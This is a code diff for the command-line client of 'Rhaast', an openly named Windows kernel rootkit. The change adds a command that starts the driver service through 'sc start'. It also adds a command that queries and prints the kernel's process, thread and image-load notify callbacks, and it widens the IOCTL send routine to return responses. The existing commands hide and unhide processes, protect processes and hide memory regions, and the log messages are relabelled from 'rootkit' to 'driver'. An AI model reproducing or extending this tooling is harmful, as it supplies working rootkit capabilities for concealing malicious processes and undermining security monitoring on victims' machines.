@@ -83,7 +83,7 @@ VOID Rhaast::Routine(
         if ( ! IsConnected() )
         {
             /* check if it is trying to connect to the driver */
-            if ( input[ 0 ] != "rhaast::connect" ) {
+            if ( input[ 0 ] != "rhaast::connect" && input[ 0 ] != "rhaast::start" ) {
                 FmtErrorNotConnected();
                 continue;
             }
@@ -147,7 +147,7 @@ BOOL Rhaast::DispatchInput(
             FAIL_END
         }
 
-        spdlog::info( "connected to rhaast rootkit via \"{}\"", args[ 1 ] );
+        spdlog::info( "connected to rhaast driver via \"{}\"", args[ 1 ] );
 
     } else if ( args[ 0 ] == "rhaast::disconnect" ) {
 
@@ -155,7 +155,12 @@ BOOL Rhaast::DispatchInput(
         CloseHandle( Handle );
         Handle = NULL;
 
-        spdlog::info( "disconnected from rhaast rootkit" );
+        spdlog::info( "disconnected from rhaast driver" );
+
+    } else if ( args[ 0 ] == "rhaast::start" ) {
+
+        /* TODO: jesus christ i am lazy to use the service api */
+        system( "sc start rhaast" );
 
     } else if ( args[ 0 ] == "process::hide" ) {
 
@@ -174,7 +179,6 @@ BOOL Rhaast::DispatchInput(
         /* convert pid string to int */
         Pid = std::stoi( args[ 1 ].c_str() );
 
-
         if ( ProcessCheckById( Pid, &Name ) )
         {
             /* warn about patch guard detection */
@@ -186,7 +190,7 @@ BOOL Rhaast::DispatchInput(
             spdlog::info( "   - process name : {}", std::string( ( PCHAR ) Name.Buffer ) );
 
             /* send command */
-            if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_HIDE, &Pid, sizeof( ULONG ) ) ) ) ) {
+            if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_HIDE, &Pid, sizeof( ULONG ), NULL, 0 ) ) ) ) {
                 spdlog::info( "process successfully hidden" );
             } else {
                 spdlog::error( "failed while hiding process" );
@@ -222,7 +226,7 @@ BOOL Rhaast::DispatchInput(
         spdlog::info( "unhide process: {}", Pid );
 
         /* send command */
-        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_UNHIDE, &Pid, sizeof( ULONG ) ) ) ) ) {
+        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_UNHIDE, &Pid, sizeof( ULONG ), NULL, 0 ) ) ) ) {
             spdlog::info( "process successfully unhidden" );
         } else {
             spdlog::error( "failed to unhide process" );
@@ -281,7 +285,7 @@ BOOL Rhaast::DispatchInput(
         spdlog::info( " - Action : {}", Remove ? "Remove" : "Add" );
 
         /* send command */
-        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_PROTECT, &Protection, sizeof( Protection ) ) ) ) ) {
+        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_PROCESS_PROTECT, &Protection, sizeof( Protection ), NULL, 0 ) ) ) ) {
             spdlog::info( "process protection applied" );
         } else {
             spdlog::error( "process protection failed to apply" );
@@ -327,10 +331,74 @@ BOOL Rhaast::DispatchInput(
         spdlog::info( " - Virtual Address: {}", args[ 2 ] );
 
         /* send command */
-        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_MEMORY_VAD, &MemoryVad, sizeof( MemoryVad ) ) ) ) ) {
+        if ( ( success = NT_SUCCESS( RhaastSend( RHAAST_COMMAND_MEMORY_VAD, &MemoryVad, sizeof( MemoryVad ), NULL, 0 ) ) ) ) {
             spdlog::info( "memory successfully hidden" );
         } else {
             spdlog::error( "failed to hide memory" );
+        }
+
+    } else if ( args[ 0 ] == "callback::list" ) {
+
+        RS_C_CALLBACK_QUERY CallbackQuery = { 0 };
+        PRS_CALLBACK_DATA   CallbackData  = NULL;
+
+        /* check if enough args has been specified */
+        ARGS_CHECK_LEN( 0 )
+
+        CallbackQuery.Type = NoneCallback;
+        CallbackQuery.Size = 0;
+
+        /* send command to query size first */
+        if ( ( success = NT_SUCCESS( RhaastSend(
+            RHAAST_COMMAND_CALLBACK_QUERY,
+            &CallbackQuery,
+            sizeof( CallbackQuery ),
+            &CallbackQuery,
+            sizeof( CallbackQuery )
+        ) ) ) ) {
+
+            /* allocate enough memory for queried callback list */
+            if ( ! ( CallbackData = ( PRS_CALLBACK_DATA ) HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, CallbackQuery.Size ) ) ) {
+                spdlog::error( "HeapAlloc failed for callback list: {}", GetLastError() );
+                FAIL_END
+            }
+
+            /* send command to query callback list */
+            if ( ( success = NT_SUCCESS( RhaastSend(
+                RHAAST_COMMAND_CALLBACK_QUERY,
+                &CallbackQuery,
+                sizeof( CallbackQuery ),
+                CallbackData,
+                CallbackQuery.Size
+            ) ) ) ) {
+
+                /* print Process Creation Notify routines */
+                spdlog::info( "[PsProcessCreation] Process Creation callbacks: " );
+                CallbackEnumList( PsProcessCreationCallback, CallbackData );
+
+                /* print Thread Creation Notify routines */
+                spdlog::info( "" );
+                spdlog::info( "[PsThreadCreation] Thread Creation callbacks: " );
+                CallbackEnumList( PsThreadCreationCallback, CallbackData );
+
+                /* print Image Load Notify routines */
+                spdlog::info( "" );
+                spdlog::info( "[PsImageLoad] Image Load callbacks: " );
+                CallbackEnumList( PsImageLoadCallback, CallbackData );
+
+                /* print Driver Verification Notify routines */
+                spdlog::info( "" );
+                spdlog::info( "[DriverVerification] Driver Verification callbacks: " );
+                CallbackEnumList( DriverVerification, CallbackData );
+
+                spdlog::info( "" );
+
+            } else {
+                spdlog::error( "failed to query callback list size" );
+            }
+
+        } else {
+            spdlog::error( "failed to query callback list size" );
         }
 
     } else {
@@ -353,9 +421,7 @@ END:
 VOID Rhaast::FmtErrorNotConnected(
     VOID
 ) {
-    spdlog::warn( "not connected with rhaast rootkit !" );
-    spdlog::info( "connect to rootkit using: rhaast::connect <DriverName>" );
-    spdlog::info( "more info type: help (command)" );
+    spdlog::warn( "not connected with rhaast driver !" );
 }
 
 /*!
@@ -428,6 +494,48 @@ BOOL Rhaast::RhaastConnect(
 
 /*!
  * @brief
+ *      iterates over given data query list
+ *      and prints entry based on given type
+ *
+ * @param Type
+ *      type to enum and display
+ *
+ * @param Data
+ *      queried data to enum
+ */
+VOID Rhaast::CallbackEnumList(
+    RS_CALLBACK_TYPE  Type,
+    PRS_CALLBACK_DATA Data
+) {
+    PRS_CALLBACK_DATA Callbacks       = NULL;
+    PCHAR             FileName[ 258 ] = { 0 };
+
+    /* set callback data */
+    Callbacks = Data;
+
+    do {
+        /* display given type */
+        if ( Callbacks->Type == Type ) {
+            spdlog::info(
+                " - {:p} :: {}+0x{:x}",
+                ( PVOID ) Callbacks->Callback,
+                Callbacks->DriverName,
+                Callbacks->Callback - Callbacks->DriverBase
+            );
+        }
+
+        /* exit loop */
+        if ( ! Callbacks->NextEntryOffset ) {
+            break;
+        }
+
+        /* next entry */
+        Callbacks = ( PRS_CALLBACK_DATA ) C_PTR( U_PTR( Callbacks ) + Callbacks->NextEntryOffset );
+    } while ( TRUE );
+}
+
+/*!
+ * @brief
  *      Send commands to the connected rhaast rootkit
  *
  * @param Command
@@ -445,7 +553,9 @@ BOOL Rhaast::RhaastConnect(
 NTSTATUS Rhaast::RhaastSend(
     ULONG Command,
     PVOID Buffer,
-    ULONG Size
+    ULONG Size,
+    PVOID Response,
+    ULONG ResponseSize
 ) {
     NTSTATUS NtStatus = STATUS_SUCCESS;
     DWORD    BytesRet = 0;
@@ -453,10 +563,8 @@ NTSTATUS Rhaast::RhaastSend(
     if ( ! DeviceIoControl(
         Handle,
         CTL_CODE( 0x8000, Command, METHOD_BUFFERED, FILE_ANY_ACCESS ),
-        Buffer,
-        Size,
-        nullptr,
-        0,
+        Buffer,   Size,
+        Response, ResponseSize,
         &BytesRet,
         nullptr
     ) ) {
@@ -466,7 +574,3 @@ NTSTATUS Rhaast::RhaastSend(
 
     return NtStatus;
 }
-
-
-
-
